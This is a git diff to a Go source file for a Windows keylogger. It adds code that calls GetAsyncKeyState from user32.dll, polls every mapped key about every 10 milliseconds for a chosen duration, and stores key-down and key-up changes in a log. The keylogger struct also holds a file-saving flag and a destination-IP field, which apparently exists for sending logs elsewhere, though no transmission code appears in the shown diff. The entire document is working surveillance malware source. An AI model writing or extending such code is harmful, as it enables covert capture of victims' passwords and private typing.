@@ -1,5 +1,11 @@
 package main
 
+import (
+	//"fmt"
+	"syscall"
+	"time"
+)
+
 // map containing the virtual keyboard key codes for windows
 
 var codes = map[int]string{
@@ -10,8 +16,8 @@ var codes = map[int]string{
 	0x09: "TAB",
 	0x0C: "CLEAR",
 	0x0D: "ENTER",
-	0x10: "SHIFT",
-	0x11: "CONTROL",
+	//0x10: "SHIFT",
+	//0x11: "CONTROL",
 	0x12: "ALT",
 	0x13: "PAUSE",
 	0x14: "CAPSLOCK",
@@ -129,9 +135,15 @@ var codes = map[int]string{
 	0xB3: "PLAY/PAUSE",
 }
 
+var (
+	user32   = syscall.NewLazyDLL("user32.dll")
+	getState = user32.NewProc("GetAsyncKeyState")
+)
+
 // represents the keylogger
 type keylogger struct {
-	keyPressed string
+	// all keys
+	log []key
 
 	// controls whether keystrokes are saved to a file
 	saveToFile bool
@@ -142,9 +154,53 @@ type keylogger struct {
 	ipdst string
 }
 
-// gets the last pressed key of the keylogger
-func (k keylogger) getKey() string {
-	return "[" + k.keyPressed + "]"
+// information about key events (key presses/up/down)
+type key struct {
+	// string representing the key
+	name string
+
+	// true means key down, false means key up
+	down bool
+}
+
+// starts logging and saving the data to a list where each element is a KEYDOWN or KEYUP event
+// should be called with 'go' keyword to run in background
+// time param is time in seconds to log for
+func (k *keylogger) startLogging(duration int) {
+
+	// logs last iteration of current keys so adjacent logs where the key's down field does not change can be discarded
+	prevCurrentKeys := []key{}
+
+	// loops for the given amount of seconds
+	for start := time.Now(); time.Since(start) < time.Second*time.Duration(duration); {
+		currentKeys := []key{}
+		for keycode := 0x01; keycode < 0xB3; keycode++ {
+			_, exists := codes[keycode]
+			if !exists {
+				continue // skip this key if it is not in the map
+			}
+
+			val, _, _ := getState.Call(uintptr(keycode))
+			isDown := (val == 32769)
+			currentKeys = append(currentKeys, key{name: codes[keycode], down: isDown})
+		}
+
+		// check differences between current and previous key logs (they should be the same length)
+		if len(prevCurrentKeys) != 0 {
+			for i := 0; i < len(currentKeys); i++ {
+				if currentKeys[i].down != prevCurrentKeys[i].down { // then there was a change in state!
+					k.log = append(k.log, currentKeys[i])
+				}
+			}
+		} else {
+			// has the function of 'extending' the slice
+			k.log = append(k.log, currentKeys...)
+		}
+
+		prevCurrentKeys = currentKeys
+		time.Sleep(10 * time.Millisecond) // limit logging to every 1/100 second
+	}
+
 }
 
 // set keylogger to record results in given file
